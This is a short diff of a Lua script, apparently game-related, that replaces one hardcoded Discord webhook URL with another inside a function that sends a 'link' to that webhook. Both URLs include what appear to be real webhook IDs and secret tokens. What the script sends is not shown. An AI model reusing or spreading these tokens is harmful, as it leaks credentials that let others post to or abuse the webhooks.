@@ -313,7 +313,7 @@ end
 -- WORKING WEBHOOK FUNCTION
 local function sendToWebhook(link)
     -- 🔥 REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL 🔥
-    local webhookUrl = "https://discord.com/api/webhooks/1439258076157972621/HGzbgcxf6xVAGc2trJBff00OR3wJ5BjNSg_vHSwOmdCYB5M2fl5RjwTdIb6SVQV9ZcWo"
+    local webhookUrl = "https://discord.com/api/webhooks/1439866425006358630/TU25PTYA6wPkY9pEim16obDK8Qa0HX6KI5mn9RcBvGcgzP6FOGdK8W6JxYKQzUNzUH2X"
     
     -- If still using placeholder, use a test webhook
     if webhookUrl:find("YOUR_WEBHOOK") then
